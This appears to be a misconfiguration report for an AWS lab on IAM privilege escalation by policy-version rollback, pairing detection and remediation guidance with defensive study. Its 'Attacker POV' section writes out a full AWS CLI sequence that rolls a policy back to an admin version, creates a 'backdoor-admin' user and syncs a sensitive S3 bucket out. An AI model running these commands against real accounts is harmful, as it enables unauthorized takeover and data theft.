# iam_privesc_by_rollback — Misconfiguration Report

## Environment Overview

An AWS environment demonstrating privilege escalation through IAM policy version rollback:

- **IAM User (Bob)** — A low privilege user account with limited current permissions
- **IAM Policy (TargetPolicy)** — A custom IAM policy with multiple versions, including historical versions that granted broader permissions
- **Policy Versioning** — AWS IAM maintains up to 5 versions of each policy, with the ability to set any version as the default/active version

---

## Attack Chain Summary

```
Low-Privilege User (Bob)
    ↓ has permission
SetDefaultPolicyVersion on TargetPolicy
    ↓ rolls back to
Previous Policy Version (v1 with Admin Rights)
    ↓ gains
Administrative Permissions
    ↓ performs
Privileged Actions Across AWS Account
```

### Exploit Steps

1. The attacker compromises the low-privilege IAM user "Bob" through credential theft, phishing, or a compromised development environment.
2. The attacker enumerates IAM permissions and discovers `iam:SetDefaultPolicyVersion` permission on a specific IAM policy.
3. The attacker lists all versions of the target policy using `aws iam list-policy-versions` and discovers that version v1 (now inactive) granted administrative or elevated permissions.
4. The attacker uses `aws iam set-default-policy-version` to rollback the policy to the older, more permissive version v1.
5. If Bob's user or role is attached to this policy (or if the attacker can attach it), Bob immediately gains the elevated permissions from the rolled-back version.
6. The attacker now has administrative or elevated access to AWS resources without creating new policies or users, making the attack harder to detect in traditional IAM audits.

### Attacker POV

```bash
# Step 1: Identify current permissions
aws iam get-user
aws iam list-attached-user-policies --user-name Bob

# Step 2: List all policies the user can manipulate
aws iam list-policies --scope Local

# Step 3: Enumerate policy versions for TargetPolicy
aws iam list-policy-versions --policy-arn arn:aws:iam::123456789012:policy/TargetPolicy

# Output shows:
# v3 (default) - Current restrictive permissions
# v2 - Moderate permissions
# v1 - Administrative permissions (old version)

# Step 4: Retrieve the policy document for v1 to verify permissions
aws iam get-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/TargetPolicy \
  --version-id v1

# Step 5: Rollback to the permissive version
aws iam set-default-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/TargetPolicy \
  --version-id v1

# Step 6: Verify escalated privileges
aws sts get-caller-identity
aws iam list-users  # Should now work if v1 granted IAM read permissions
aws s3 ls           # Should now work if v1 granted S3 access

# Step 7: Perform privileged actions
aws ec2 describe-instances
aws iam create-user --user-name backdoor-admin
aws s3 sync s3://sensitive-bucket ./exfiltrated-data
```

---

## Misconfiguration Findings

### 1. Overly Permissive IAM Policy: SetDefaultPolicyVersion

**What:** The low-privilege user "Bob" has been granted `iam:SetDefaultPolicyVersion` permission on a custom IAM policy. This permission allows Bob to revert the policy to any of its previous versions, including versions that may have granted significantly broader permissions.

**IAM Policy Example:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "iam:SetDefaultPolicyVersion",
      "Resource": "arn:aws:iam::123456789012:policy/TargetPolicy"
    }
  ]
}
```

This permission is extremely dangerous because:
- It allows manipulation of existing permissions without creating new policies
- Historical policy versions can often contain overly permissive rules that were patched out or fixed in later versions
- Organizations often forget to delete old policy versions after tightening permissions

**Mitigation:** Remove `iam:SetDefaultPolicyVersion` permission from non-administrative users. This permission should only be granted to highly trusted administrators or automated CI/CD service accounts under strict control.

**Better Approach:**
- Use Infrastructure-as-Code (Terraform, CloudFormation) to manage IAM policies
- Delete old policy versions after updating policies: `aws iam delete-policy-version`
- Implement approval workflows for policy changes using AWS Service Catalog or custom Lambda functions

**Why bother:** `SetDefaultPolicyVersion` is a direct privilege escalation vector. An attacker can instantly gain administrative access if any historical policy version granted elevated permissions.

---

### 2. Retention of Overly Permissive Historical Policy Versions

**What:** The IAM policy "TargetPolicy" retains multiple versions, including version v1 which grants administrative permissions. AWS IAM retains up to 5 versions of each policy, but there is no automatic cleanup of old, dangerous versions.

**Policy Version History:**
```
v3 (default, current): Restrictive - read-only S3 access
v2: Moderate - S3 read/write on specific buckets
v1: Administrative - S3FullAccess, EC2FullAccess, IAMReadOnlyAccess
```

Organizations often tighten permissions over time (v1 → v2 → v3) but fail to delete the old, permissive versions. This leaves a vector that can be exploited via rollback.

**Mitigation:** 
- After updating a policy to more restrictive permissions, immediately delete old permissive versions:
  ```bash
  aws iam delete-policy-version \
    --policy-arn arn:aws:iam::123456789012:policy/TargetPolicy \
    --version-id v1
  ```
- Implement policy review workflows that flag policies with multiple versions for cleanup
- Use AWS Config rules to detect policies with more than 2 versions
- Document why each policy version exists and set expiration dates for old versions

**Why bother:** Historical policy versions are "dormant threats". They provide an easy rollback target for attackers who gain the `SetDefaultPolicyVersion` permission.

---

### 3. Lack of Monitoring on IAM Policy Changes

**What:** There is no CloudWatch alarm, CloudTrail alert, or Security Hub finding configured to detect when IAM policy versions are changed. This allows attackers to silently roll back policies without triggering alerts.

**Mitigation:** Configure CloudWatch Events or EventBridge rules to monitor CloudTrail for `SetDefaultPolicyVersion` API calls.

**Example EventBridge Rule:**
```json
{
  "source": ["aws.iam"],
  "detail-type": ["AWS API Call via CloudTrail"],
  "detail": {
    "eventName": ["SetDefaultPolicyVersion"],
    "requestParameters": {
      "policyArn": ["arn:aws:iam::*:policy/*"]
    }
  }
}
```

**Alert Actions:**
- Send SNS notification to security team
- Trigger Lambda function to auto-revert the change
- Create high-priority ticket in incident management system
- Temporarily suspend the IAM user who made the change

**Why bother:** Detection is critical. Even if the misconfiguration exists, rapid detection and response can minimize damage. Without monitoring, attackers can maintain elevated access for days or weeks.

---

### 4. Insufficient Separation of Duties

**What:** The same user or role that uses a policy also has permission to modify that policy's versions. This violates the principle of separation of duties.

**Mitigation:**
- Policy **users** should not have permission to modify the policies they use
- Policy **management** (create, update, delete) should be restricted to:
  - Security/DevOps teams
  - Automated CI/CD pipelines with approval workflows
  - Break-glass administrative roles
- Implement four-eyes principle: require approval from a second administrator before policy changes take effect

**Why bother:** Separation of duties ensures that compromising a single account doesn't give attackers full control over their own permissions.

---

## Severity & Impact

| Factor | Reality |
|--------|---------|
| Skill Required | Low/Basic AWS CLI knowledge |
| Exploit Time | < 2 minutes |
| Detection Likelihood | Very Low (without proper monitoring) |
| Persistence | High (policy remains rolled back until manually reverted) |
| Blast Radius | Depends on historical policy version (potentially entire AWS account) |
| Stealth | High (no new resources created, only metadata changed) |

The attack requires only:
- Compromised credentials for a low-privilege user
- Knowledge of AWS CLI `iam:` commands
- The existence of a permissive historical policy version

**Unique Threat:** Unlike other privilege escalation techniques that create new resources (users, keys, roles), this attack simply changes metadata, making it harder to detect with traditional monitoring.

---

## Detection Indicators

### CloudTrail Events to Monitor:
```
EventName: SetDefaultPolicyVersion
userIdentity.principalId: AIDAI... (Bob's user ID)
requestParameters.policyArn: arn:aws:iam::123456789012:policy/TargetPolicy
requestParameters.versionId: v1
```

### Indicators of Compromise (IOCs):
- Policy version changes outside of normal maintenance windows
- Rollback to significantly older policy versions (e.g., v3 → v1, skipping v2)
- `SetDefaultPolicyVersion` calls from low-privilege users
- Sudden spike in API calls from a previously quiet IAM principal immediately after policy rollback
- Access to resources that should be restricted (e.g., production S3 buckets, IAM user lists)

---

## Real-World Precedent

**Similar Techniques:**
- **Azure AD Role Rollback:** Attackers with `RoleManagement.ReadWrite.Directory` permission can reinstate deleted role assignments
- **Kubernetes RBAC Manipulation:** Attackers with `update` permissions on RoleBindings can grant themselves cluster-admin
- **Active Directory Group Policy Rollback:** Attackers with GPO modification rights can revert to weaker security policies

**Common Scenario:** Organizations implement security hardening initiatives, tightening IAM policies over time. Old permissive versions are left in place either for reference or in case there is a need to roll back. Attackers then discover and exploit these forgotten versions as documented.

---

## Remediation Priority

### Immediate (< 24 hours):
1.Audit all IAM policies for `SetDefaultPolicyVersion` permissions
2.Remove `SetDefaultPolicyVersion` from all non-administrative users
3.Review CloudTrail logs for `SetDefaultPolicyVersion` events in past 90 days
4.If unauthorized rollback detected, immediately revert to correct version

### Short-term (< 1 week):
1.Delete old permissive policy versions across all custom IAM policies:
   ```bash
   # List all non-default versions
   aws iam list-policy-versions --policy-arn <arn>
   
   # Delete old versions (keep only current and previous for rollback safety)
   aws iam delete-policy-version --policy-arn <arn> --version-id v1
   ```
2.Implement CloudWatch/EventBridge monitoring for policy version changes
3.Conduct IAM permission review using IAM Access Analyzer
4.Document legitimate use cases for `SetDefaultPolicyVersion`

### Long-term (< 1 month):
1.Migrate IAM policy management to Infrastructure-as-Code (Terraform, CDK, CloudFormation)
2.Implement policy change approval workflows
3.Enable AWS Config rule to flag policies with > 2 versions
4.Conduct quarterly IAM policy version cleanup
5.Enforce separation of duties for IAM management

---

## Comparison with Similar Privilege Escalation Techniques

| Technique | Permission Required | Stealth | Persistence |
|-----------|---------------------|---------|-------------|
| **Policy Rollback** | `SetDefaultPolicyVersion` | Very High | High |
| CreateAccessKey | `CreateAccessKey` on admin user | Medium | High |
| AttachUserPolicy | `AttachUserPolicy` | Low | High |
| CreatePolicyVersion | `CreatePolicyVersion` | Low | Medium |
| AssumeRole | `AssumeRole` on admin role | Medium | Low (temporary) |

**Why Rollback is Dangerous:**
- Creates no new resources thus is hard to detect
- Uses existing, "approved" policy versions, bypassing change management
- Instant privilege escalation
- Often overlooked in IAM audits

---

## Bottom Line

This configuration presents a **high severity** finding due to:
- Direct privilege escalation path with minimal effort
- Very low detection likelihood without specific monitoring
- High persistence (rolled-back policy remains until manually reverted)
- Stealthy attack vector (no new resources created)

**Impact:** An attacker with `SetDefaultPolicyVersion` permission can gain administrative access in under 2 minutes if any historical policy version granted elevated permissions.

**Key Takeaway:** IAM policy versions are a hidden attack surface. Organizations must:
1. Strictly control who can modify policy versions
2. Delete old permissive policy versions after tightening security
3. Monitor for `SetDefaultPolicyVersion` API calls
4. Implement separation of duties for IAM management

**This vulnerability is particularly insidious because it exploits an organization's own security improvements against itself.** It exploits the the very act of tightening permissions (creating new, more restrictive policy versions) which can leave behind exploitable historical versions.